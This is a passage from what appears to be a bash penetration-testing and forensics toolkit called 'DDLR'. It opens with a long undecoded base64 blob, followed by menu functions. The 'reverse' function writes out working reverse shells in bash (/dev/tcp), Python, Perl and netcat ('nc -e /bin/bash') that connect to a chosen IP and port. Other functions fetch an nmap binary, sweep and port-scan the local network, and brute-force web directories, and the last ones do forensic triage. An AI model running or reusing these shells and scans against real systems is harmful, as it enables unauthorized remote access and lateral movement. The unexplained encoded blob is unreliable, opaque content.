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"

reverse() {
	clear
	if command -v figlet >/dev/null 2>&1; then
		figlet "DDLR Reverse Sheller" | lolcat
	else 
		lecho "
________________________		
		DDLR Reverse Sheller
________________________"
	fi

while true; do
	lecho "Select an option:"
	lecho "1. Bash"
	if command -v python >/dev/null 2>&1; then
		lecho "2. Python"
		pyton="python"
	elif command -v python3 >/dev/null 2>&1; then
		lecho "2. Python3"
		pyton="python3"
	else 
		lecho "2. Python (Not Installed)"
	fi
	if command -v perl >/dev/null 2>&1; then
		lecho "3. Perl"
	else 
		lecho "3. Perl (Not Installed)"
	fi
	if command -v nc >/dev/null 2>&1; then
		lecho "4. Netcat"
	else
		lecho "4. Netcat (Not Installed)"
	fi
	
	lecho "5. Return to main menu"
	read -p "Option: " opcion

	opcion_numero="${opcion%[dD]}"
	
	read -p "IP: " ip
	read -p "PORT: " port
case $opcion_numero in
	1)
	 # fix falta detach
	 echo "*** NEED FIX - Detach needed"
		sh -i >& /dev/tcp/$ip/$port 0>&1
		;;
	2)
		if [ $pyton == "python3" ]; then
			export RHOST="$ip";export RPORT=$port;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' &
		else
			echo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$ip'",'$port'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'  &
		fi 
		;;
	3)
	 # fix falta detach
	 echo "*** NEED FIX - Detach needed"
		perl -e 'use Socket;$i="'$ip'";$p='$port';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
		;;
	4)
		nc $ip $port -e /bin/bash &
		;;
	5)
		break
		;;
	*)
		lecho "Invalid option."
		;;
esac
done
}

netscan () {
	clear
	if command -v figlet >/dev/null 2>&1; then
		figlet "Network Scanner" | lolcat
	else 
		lecho "
________________________		
		Network Scanner
________________________"
	fi

while true; do
	lecho "Select an option:"
	lecho "1. Download and setup nmap"
	lecho "2. Lateral pingsweep"
	lecho "3. Scan network's open ports"
	lecho "4. Clean trash files"
	lecho "5. Return to main menu"
	read -p "Option: " opcion

	opcion_numero="${opcion%[dD]}"
case $opcion_numero in
	1)
		if [ -e "./nmap" ]; then
			lecho "File is up and ready."
		else
			lecho "Downloading and setting perms..."
			wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap; chmod +x ./nmap;
		fi
		;;
	2)
		interfaces=$(ip -o link show | awk -F': ' '{print $2}')


		for interface in $interfaces; do
		  ip_address=$(ip -o -4 addr show dev $interface | awk '{split($4,a,"/"); print a[1]}')
		  if [ "$ip_address" != "127.0.0.1" ]; then
		    echo "Executing nmap on $interface $ip_address"
		    ip=$(echo "$ip_address" | awk -F. '{OFS="."; NF=NF-1;print}')
		    nmap -sn $ip".0/24" -oG ddlr.txt >> /dev/null
		    cat ddlr.txt
		    echo
		  fi
		done
		;;
	3)
		if [ -e "./ddlr.txt" ]; then
			cat ddlr.txt|grep Up|awk '{print $2}' > ddlr2.txt
			cat ddlr2.txt
			nmap -sV -iL ddlr2.txt -vvv --open -oG ddlr3.txt
			echo
			echo
			cat ddlr3.txt
		else
			lecho "You must execute Lateral pingSweep first (option 2)"
		fi
		;;
	4)
		lecho "Cleaning up!"
		rm -fr ddlr*
		;;
	5)
		lecho "Nice!"
		break
		;;
	*)
		lecho "Invalid option."
		;;
esac
	read -p "Press enter to continue..."
done

}
scrapper() {
	clear
	if command -v figlet >/dev/null 2>&1; then
		figlet "DDLR Scrapper" | lolcat
	else 
		lecho "
________________________		
		DDLR Scrapper
________________________"
	fi


while true; do
	lecho "Select an option:"
	lecho "1. Extract comments from a file"
	lecho "2. Extract links from a file"
	lecho "3. Extract comments from a URL"
	lecho "4. Extract links from a URL"
	lecho "5. Get domains associated with an IP (Reverse DNS)"
	lecho "6. Get Historic DNS Reg."
	lecho "7. Directory Brute-Force"
	lecho "8. Back to main menu"
	lecho "* [n]d to extract unique domains"
	read -p "Option: " opcion

	opcion_numero="${opcion%[dD]}"
case $opcion_numero in
	1)
		read -p "Enter file path: " archivo
		if [[ $opcion == *d* ]]; then
			grep -o '<!--[^>]*-->' "$archivo" | grep -oE '(http|https)://[^/"]+' | sort -u
		else
			grep -o '<!--[^>]*-->' "$archivo" | sort -u
		fi | sort -u
		;;
	2)
		read -p "Enter file path: " archivo
		if [[ $opcion == *d* ]]; then
			grep -Eo 'href="([^"]+)"|src="([^"]+)"' "$archivo" | grep -Eo '(href|src)="([^"]+)"' | cut -d'"' -f2 | grep -oE '(http|https)://[^/"]+' | sort -u
		else
			grep -Eo 'href="([^"]+)"|src="([^"]+)"' "$archivo" | grep -Eo '(href|src)="([^"]+)"' | cut -d'"' -f2 | sort -u
		fi
		;;
	4)
		read -p "Enter full URL: " url
		if [[ $opcion == *d* ]]; then
			lynx -listonly -image_links -dump "$url" | grep -oE '(http|https)://[^/"]+' | sort -u
		else
			lynx -listonly -image_links -dump "$url"
		fi
		;;
	3)
		read -p "Enter full URL: " url
		if [[ $opcion == *d* ]]; then
			curl -s "$url" | grep -o '<!--[^>]*-->' | grep -oE '(http|https)://[^/"]+' | sort -u
		else
			curl -s "$url" | grep -o '<!--[^>]*-->' | sort -u
		fi
		;;
	5)
		read -p "Enter IP/Domain: " ip_address
		reverse_dns=$(host "$ip_address")
		if [[ $? -eq 0 ]]; then
			    domains=$(echo "$reverse_dns" | awk '{print $NF}' | sed 's/\.$//')
			        echo "DNS Results for $ip_address:"
				    echo "$domains"
			    else
				        echo "Failled to get DNS for $ip_address."
		fi
		;;
	6)
		read -p "Enter domain: " domain
		lista_ip_viejos=()

		IP_history=$(curl -s 'https://dnshistory.org/historical-dns-records/a/'$domain | grep -Eo '[0-9]{4}-[0-9]{2}-[0-9]{2} -> [0-9]{4}-[0-9]{2}-[0-9]{2} <a href="[^"]+">[0-9.]+</a>' | sed -E 's/<a href="[^"]+">//;s/<\/a>//' )

		echo -e "$IP_history"
		echo
		;;
	7)
		read -p "Enter URL: " server
		dictionary="directory.txt"
		read -p "N process: " proc
		if [[ $? -eq 0 ]]; then
			process_directory() {
    			word=$1
    			url="$server/$word"
    			response=$(curl -s -o /dev/null -w "%{http_code}" "$url")
    			if [ "$response" == "200" ]; then
        			echo "
       				Directory found: $url $response" 
        			echo $url >> "Directory_list.txt"
    			else 
    				echo -n "."
    			fi
					}
			export -f process_directory
			cat "$dictionary" | xargs -I{} -P $proc bash -c 'server="$0" process_directory "$@"' "$server" {}
			n=$(wc -l < "Directory_list.txt")
			lecho "
			Dictionary ended with $n matches:
			"			
			cat "Directory_list.txt"
		fi
		;;
	
	8)
		echo "Nice!"
		break
		;;
	*)
		echo "Invalid option."
		;;
esac
	read -p "Press enter to continue..."
done

}


differ() {
    echo "Enter the path of the old file:"
    read -r old_file
    echo "Enter the path of the new file:"
    read -r new_file

    echo "Comparing files..."
    diff -u "$old_file" "$new_file" | while IFS= read -r line; do
        case $line in
            -*) printf "\033[31m$line\033[0m\n" ;; 
            +*) printf "\033[32m$line\033[0m\n" ;; 
            *)  printf "%s\n" "$line" ;;
        esac
    done

    echo


}

dfir() {
# Ask for the path to analyze
read -p "Enter the path to analyze: " folder

# Create the HTML file
html_file="$(date +'%Y-%m-%d_%H-%M-%S')_result.html"
touch "$html_file"

# Write the HTML header to the file
echo "<html><head><title>DFIR Data Analysis</title>
<style>
    body {
        background-color: #f2f2f2;
        color: #333;
        font-family: Arial, sans-serif;
    }
    h1 {
        text-align: center;
        font-size: 2.5rem;
        color: #006699;
        margin-top: 1.5rem;
        margin-bottom: 1rem;
    }
    h2 {
        font-size: 1.5rem;
        margin-top: 2rem;
        color: #333;
    }
    table {
        border-collapse: collapse;
        width: 100%;
        margin-top: 1rem;
    }
    th, td {
        text-align: left;
        padding: 0.5rem;
        border: 1px solid #ddd;
    }
    th {
        background-color: #006699;
        color: #fff;
    }
</style>
</head><body>" >> "$html_file"

# Iterate over the files in the folder and its subfolders
find "${folder}" -type f -print0 | while IFS= read -r -d '' file
do
    # Get the file name
    filename=$(basename "$file")

    # Get the MD5 and SHA1 hashes of the file
    md5=$(md5sum "$file" | cut -d ' ' -f 1)
    sha1=$(sha1sum "$file" | cut -d ' ' -f 1)

    # Get the metadata using exiftool
    metadata=$(exiftool "$file")

    # Write the information to the HTML file
    echo "<h2>${filename}</h2>" >> "$html_file"
    echo "<table>" >> "$html_file"
    echo "<tr><td>Header:</td><td>$(file "$file")</td></tr>" >> "$html_file"
    echo "<tr><td>MD5:</td><td>${md5}</td></tr>" >> "$html_file"
    echo "<tr><td>SHA1:</td><td>${sha1}</td></tr>" >> "$html_file"
    echo "<tr><td>Metadata:</td><td><pre>${metadata}</pre></td></tr>" >> "$html_file"
    echo "</table><br>" >> "$html_file"
done

# Write the closing tags to the HTML file
echo "</body></html>" >> "$html_file"

echo "The analysis has been saved to the file ${html_file}"

# Open the HTML file in the default web browser
xdg-open "$html_file"


}
gather_system_information() {
  # Create output file with date and time
  output_file="TriageDDLR/system_information_$(date +"%Y%m%d_%H%M%S").txt"

  # Kernel version
  echo "Kernel version:" >> "$output_file"
  uname -r >> "$output_file"
  echo >> "$output_file"

  # Kernel modules
  echo "Kernel modules:" >> "$output_file"
  lsmod >> "$output_file"
  echo >> "$output_file"

  # Network interfaces
  echo "Network interfaces:" >> "$output_file"
  ip a >> "$output_file"
  echo >> "$output_file"

  # Hostname
  echo "Hostname:" >> "$output_file"
  hostname >> "$output_file"
  echo >> "$output_file"

  # Distribution versions
  echo "Distribution versions:" >> "$output_file"
  cat /etc/*-release >> "$output_file"
  echo >> "$output_file"

  # Last Logins
  echo "Last Logins:" >> "$output_file"
  last >> "$output_file"
  echo >> "$output_file"
  cat "$output_file"
  echo "System information successfully gathered. Output file: $output_file"
  
}

# Function to analyze connections
analyze_connections() {
  # Create output file with date and time
  output_file="TriageDDLR/connections_$(date +"%Y%m%d_%H%M%S").txt"

  # Established connections
  echo "Established connections:" >> "$output_file"
  ss -tun >> "$output_file"
  echo >> "$output_file"
  cat "$output_file"
  echo "Connection analysis completed. Output file: $output_file"
  
}

# Function to list handles
list_handles() {
